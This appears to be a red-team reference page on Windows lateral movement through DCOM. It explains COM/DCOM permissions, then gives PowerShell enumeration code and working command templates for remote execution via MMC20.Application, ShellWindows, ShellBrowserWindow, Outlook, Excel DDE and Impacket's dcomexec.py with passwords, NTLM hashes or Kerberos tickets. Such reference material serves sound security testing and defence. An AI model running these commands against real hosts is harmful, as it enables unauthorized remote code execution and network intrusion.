# Windows - Lateral movement - Over Distributed Component Object Model (DCOM)

### DCOM overview

`Component Object Model (COM)` is a Microsoft standard for inter-process
communication. `COM` specifies an object model and programming requirements
that enable `COM objects` (also called `COM components`) to interact with one
another. A `COM object` defines one, or more, sets of functions (`methods`),
called `interfaces`, that are the only way to manipulate the data associated
with the object. A `COM server` object provides services to `COM clients`
through its implemented `methods`, called by the clients after retrieving a
pointer to the `COM server` object interface.

The proprietary Microsoft `Distributed Component Object Model (DCOM)`
technology allows for networked communication of `COM objects` over the
`Microsoft Remote Procedure Call (MSRPC)` protocol, with a first connection
initiated on the remote system port TCP 135.

The `COM` / `DCOM` object register a few notable identifiers:
  - The `Class Identifier (CLSID)`, a `GUID` acting as a unique identifier for
  every `COM class` registered in Windows. The `CLSID key` in the registry
  points to the implementation of the class.
  - The optional `Programmatic Identifier (ProgID)`, that can supplement a
  `COM class` `CLSID` with a more human-readable name. Not every `COM class`
  is associated with a `ProgID`.
  - The `Application Identifier (AppID)`, which groups the configuration for
  one, or more, `DCOM objects` hosted by the same executable into one
  centralized location in the registry (`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\
  AppID\{<APPID>}`).

The configuration defined in `AppID` notably specify, the form of `Access
Control List (ACL)`, the following permissions:
   - `Launch Permissions`, that restrict the security principals that can
   locally or remotely start the `DCOM object` server
   - `Access Permissions`, that restrict the security principals that can
   locally or remotely access the `DCOM object` methods
   - `Configuration Permissions`, that restrict the security principals that
   can modify the configuration of the `DCOM` objects.

System-wide limits are defined and control the minimal level of restrictions
`DCOM applications` can set. By default, `Everyone` and non authenticated
users (`ANONYMOUS LOGON`) may be granted local or remote access to `DCOM
object` methods while only members of the local `Administrators`, `Distributed
COM Users`, and `Performance Log Users` may be granted remote `launch` and
`activation` rights.

If the `Access Permissions` is left unspecified in the `AppID` configuration,
the system-wide `Access Permissions` and `Launch Permissions` are applied. By
default, the `Remote Access` right is only granted to the Windows local
built-in `Administrators` group. The `AppID` registered on a system can be
browsed and edited using the `dcomcnfg.exe` Windows built-in utility or, the
dedicated `OleViewDotNet` .NET utility.

A client request the instantiation of a remote `DCOM` object class by
specifying its `CLSID` or `ProgID`, the later being resolved to the associated
`CLSID`. The `DCOMLaunch` service (`C:\Windows\system32\svchost.exe -k
DcomLaunch`, for `DCOM objects` from an `exe` binary) or `DLLHOST.exe` (for
`DCOM objects` from a `DLL`) then instantiate the requested `DCOM` object
class, on condition that the client has the necessary access permissions (as
defined in the `APPID` configuration). The error code `80070005` (for
`E_ACCESSDENIED`) will be returned otherwise.

###### CLSID enumeration

PowerShell can be used to list the `CLSID` and `ProdID` properties of the
`DCOM objects` registered on the local computer `HKEY_CLASSES_ROOT` registry
hive. The `HKEY_CLASSES_ROOT` registry hive cannot be directly accessed on a
remote computer using `Get-ChildItem`. In order to remotely access the
`HKEY_CLASSES_ROOT` registry hive, the following PowerShell commands can be
run over `WinRM` using the `Invoke-Command` PowerShell cmdlet.

```
# Lists
Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID | ForEach-Object {

  $DCOMClass = New-Object PSObject -Property @{
    CLSID = $_.Name.Split("{")[1].Split("}")[0]
  }

  If ($_.GetSubKeyNames() -match "ProgID") {
    $DCOMClass | Add-Member -Type NoteProperty -Name "ProgID" -Value $_.OpenSubKey("ProgID").GetValue("")
  }

  Else {
    $DCOMClass | Add-Member -Type NoteProperty -Name "ProgID" -Value $null
  }

  return $DCOMClass
}

# Filters by ProgID
Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID -Recurse -Include 'ProgID' | ForEach-Object { If ($_.GetValue("") -match "<PROGID>") { return $_.Name,$_.GetValue("") }}

# Filter by CLSID
Get-ChildItem REGISTRY::HKEY_CLASSES_ROOT\CLSID -Recurse | ForEach-Object { If ($_.Name -match "<CLSID>") { return $_.Name,$_.GetValue("") }}
```

###### Code execution over DCOM

Multiple `DCOM objects` classes can be leveraged to execute commands on the
remote system. The idea of using `DCOM objects` for lateral movements having
come to light recently, in January 2017 after a publication by `enigma0x3`, the
below list, mostly gathered from
`https://www.cybereason.com/blog/dcom-lateral-movement-techniques`, is possibly
far from being exhaustive.

PowerShell and `Impacket`'s `dcomexec.py` Python script can be used to execute
commands through `DCOM` objects:

```
# PowerShell
# MMC20.Application
# Blocked by the default Windows firewall rules
# Starts a child process under Microsoft Management Console (mmc.exe)
$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("<C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | BINARY>", $null, <$null | "COMMAND_ARGS">, "7")

# ShellWindows
# Blocked by the default Windows firewall rules
# Requires a File Explorer or Internet Explorer process on the remote system
$dcom = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "<IP¨>"))
$dcom[0].Document.Application.ShellExecute("<BINARY>")
$dcom[0].Document.Application.ShellExecute("<BINARY>", "<COMMAND_ARGS>", "<EXEC_DIRECTORY>", $null, 0)

# ShellBrowserWindow
# Blocked by the default Windows firewall rules
# DOES NOT require a File Explorer or Internet Explorer process on the remote system
# Only available on
$dcom = [activator]::CreateInstance([type]::GetTypeFromCLSID("c08afd90-f2a1-11d1-8455-00a0c91f3880", "<IP¨>"))
$dcom.Document.Application.ShellExecute("<BINARY>")
$dcom.Document.Application.ShellExecute("<BINARY>", "<COMMAND_ARGS>", "<EXEC_DIRECTORY>", $null, 0)

# Outlook through Shell.Application
# Blocked by the default Windows firewall rules?
# Requires Outlook to be installed on the remote system
$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application", "<IP¨>"))
$dcom_shell = $dcom.CreateObject("Shell.Application")
$dcom_shell.ShellExecute("<BINARY>")
$dcom_shell.ShellExecute("<BINARY>", "<COMMAND_ARGS>", "<EXEC_DIRECTORY>", $null, 0)

# Excel.Application DDE
# Blocked by the default Windows firewall rules?
# Requires Excel to be installed on the remote system
# The name of the specified binary is limited to 8 characters maximum, so a binary present in the %PATH%, such as powershell.exe or cmd.exe, must be used
$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","<IP>"))
$dcom.DisplayAlert = $False
$dcom.DDEInitiate("<BINARY>","<COMMAND_ARGS>")

# Python
# dcomexec.py executes by default a semi-interactive shell using the ShellBrowserWindow DCOM oject.
# NTLM authentication
dcomexec.py -debug [-object <MMC20 | ShellWindows | ShellBrowserWindow>] [-target-ip <TARGET_IP>] [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<HOSTNAME | IP> <TASK_COMMAND>
dcomexec.py -debug [-object <MMC20 | ShellWindows | ShellBrowserWindow>] -hashes <LM_HASH:NT_HASH> [-target-ip <TARGET_IP>] [[<DOMAIN>/]<USERNAME>@<HOSTNAME | IP> <TASK_COMMAND>

# Kerberos authentication
export KRB5CCNAME=<TICKET_CCACHE_FILE_PATH>
dcomexec.py -debug [-object <MMC20 | ShellWindows | ShellBrowserWindow>] -k -no-pass -dc-ip <DC_IP> <HOSTNAME> "<COMMAND | TASK_COMMAND>"

# More Microsoft Office DCOM objects can be leveraged for lateral movements, as described in the provided source above
```
